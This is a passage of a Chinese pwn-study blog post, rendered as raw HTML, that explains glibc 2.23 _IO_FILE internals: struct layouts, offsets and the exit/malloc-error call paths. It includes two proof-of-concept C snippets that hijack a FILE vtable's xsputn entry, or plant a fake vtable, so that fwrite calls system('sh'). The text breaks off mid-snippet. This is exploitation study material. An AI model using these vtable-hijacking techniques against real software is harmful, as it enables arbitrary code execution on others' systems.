<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>IO_FILE | 菜鸡PWN</title><meta name="keywords" content="PWN"><meta name="author" content="LOLOLO"><meta name="copyright" content="LOLOLO"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="_IO_FILE结构体利用首先明确我们利用的_IO_FILE的结构是怎样的，代码如下，先是定义了_IO_list_all，定义如下 1extern struct _IO_FILE_plus *_IO_list_all;  很明显可以知道IO_list_all是一个_IO_FILE_plus类型的指针，而IO_FILE_plus的定义如下 12345struct _IO_FILE_plus&amp;#123">
<meta property="og:type" content="article">
<meta property="og:title" content="IO_FILE">
<meta property="og:url" content="https://lololo-pwn.github.io/2021/11/23/IO-FILE/index.html">
<meta property="og:site_name" content="菜鸡PWN">
<meta property="og:description" content="_IO_FILE结构体利用首先明确我们利用的_IO_FILE的结构是怎样的，代码如下，先是定义了_IO_list_all，定义如下 1extern struct _IO_FILE_plus *_IO_list_all;  很明显可以知道IO_list_all是一个_IO_FILE_plus类型的指针，而IO_FILE_plus的定义如下 12345struct _IO_FILE_plus&amp;#123">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lololo-pwn.github.io/img/bk.jpg">
<meta property="article:published_time" content="2021-11-23T12:27:38.000Z">
<meta property="article:modified_time" content="2021-11-24T08:02:07.738Z">
<meta property="article:author" content="LOLOLO">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lololo-pwn.github.io/img/bk.jpg"><link rel="shortcut icon" href="/img/lolo.jpg"><link rel="canonical" href="https://lololo-pwn.github.io/2021/11/23/IO-FILE/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'IO_FILE',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-11-24 16:02:07'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/lolo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bk.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">菜鸡PWN</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">IO_FILE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-11-23T12:27:38.000Z" title="发表于 2021-11-23 20:27:38">2021-11-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-11-24T08:02:07.738Z" title="更新于 2021-11-24 16:02:07">2021-11-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="IO_FILE"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="IO-FILE结构体利用"><a href="#IO-FILE结构体利用" class="headerlink" title="_IO_FILE结构体利用"></a>_IO_FILE结构体利用</h1><p>首先明确我们利用的_<strong>IO_FILE</strong>的结构是怎样的，代码如下，先是定义了_<strong>IO_list_all</strong>，定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure>

<p>很明显可以知道<strong>IO_list_all</strong>是一个_<strong>IO_FILE_plus</strong>类型的指针，而<strong>IO_FILE_plus</strong>的定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面的代码又告诉我们，每个_<strong>IO_FILE_plus</strong>又包含了两个内容分别是_<strong>IO_FILE file</strong>和*<strong>vtable</strong>，其中vtable又是_<strong>IO_jump_t</strong>类型的指针</p>
<h2 id="IO-FILE-file结构如下"><a href="#IO-FILE-file结构如下" class="headerlink" title="IO_FILE file结构如下"></a>IO_FILE file结构如下</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>             /*这个用来链接下一个<span class="title">FILE</span>结构  0<span class="title">x68</span>*/</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  <span class="title">int</span> _<span class="title">fileno</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在我的理解下，在程序启动时FILE结构体会通过<strong>struct _IO_FILE</strong>  *_<strong>chain</strong>链接成为一个表，<strong>在x64位下chain的偏移为0x60</strong>，而链表头部用_<strong>IO_list_all</strong>指针表示。</p>
<p>则有一开始的顺序为_<strong>IO_list_all</strong>-&gt;<strong>stderr</strong>-&gt;<strong>stdout</strong>-&gt;<strong>stdin</strong>。在程序的bss段，我们能找到stderr\stdout\stdin等符号，这些符号只是指向了FILE的结构的指针；而真正的符号如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br><span class="line">上面三个符号，每一个都是被_IO_FILE_plus定义的，即每一个都包含了_IO_FILE file和*vtable</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/23/IO-FILE/list.png"></p>
<p>这里借助其他师傅的博客参考了_IO_FILE_plus的各个位移记录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure>

<h2 id="vtable结构如下"><a href="#vtable结构如下" class="headerlink" title="vtable结构如下"></a>vtable结构如下</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>vtable是_IO_jump_t类型的指针，_IO_jump_t中保存了一些函数指针，在后面我们会看到在一系列标准IO函数中会调用这些函数指针，该类型在libc文件中的导出符号是_IO_file_jumps。</p>
<p>简单记录一些C函数对应调用了_IO_jump_t的函数</p>
<ol>
<li>printf/puts 最终会调用_IO_file_xsputn</li>
<li>fclose 最终会调用_IO_FILE_FINISH</li>
<li>fwrite最终会调用_IO_file_xsputn</li>
<li>fread 最终会调用_IO_fiel_xsgetn</li>
<li>scanf/gets最终会调用_IO_file_xsgetn</li>
</ol>
<p><strong>通常会将_IO_overflow_t，改为system或onegadget地址完成利用</strong>。</p>
<p>这里记录两个特别的调用，就是调用exit()的时候会进行如下的调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>) ==&gt; __run_exit_handlers ==&gt; _IO_cleanup ==&gt; _IO_flush_all_lockp ==&gt; IO_file_overflow ==&gt; <span class="built_in">malloc</span> .....</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>发生错误时调用-&gt;malloc_printerr打印错误信息-&gt;_IO_flush_all_lockp-&gt; _IO_OVERFLOW     (当满足下面条件时，会执行最后调用OVERFLOW)</span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>



<h2 id="两种利用-IO-FILE的方式-2-23版本下"><a href="#两种利用-IO-FILE的方式-2-23版本下" class="headerlink" title="两种利用_IO_FILE的方式(2.23版本下)"></a>两种利用_IO_FILE的方式(2.23版本下)</h2><h3 id="首先是对vtable进行利用-两种劫持方法"><a href="#首先是对vtable进行利用-两种劫持方法" class="headerlink" title="首先是对vtable进行利用(两种劫持方法)"></a>首先是对vtable进行利用(两种劫持方法)</h3><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>直接改写vtable的内容，即是_IO_jump_t结构体里面的函数；POC如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=<span class="number">0x41414141</span> <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;call 0x41414141&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上诉代码表明了，我们可以直接给vtable的函数参数，一般某个函数的确定是依靠我们使用的IO函数来确定的；上述代码中，调用了printf函数，而printf最终会调用_IO_file_xsputn，而该函数在_IO_jump_t中的偏移为7，即vtavle[7]。</p>
<p><strong>xsputn 等 vtable 函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus 地址。比如这例子调用 printf，传递给 vtable 的第一个参数就是_IO_2_1_stdout_的地址。</strong></p>
<p>利用这点可以实现给劫持的 vtable 函数传參，比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    memcopy(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fwrite会调用xsputn，即vtable[7]。即最后应该是system(“hi”,2,1,fp)。</p>
<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>伪造vtable，手动构造vtable的函数；POC如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span 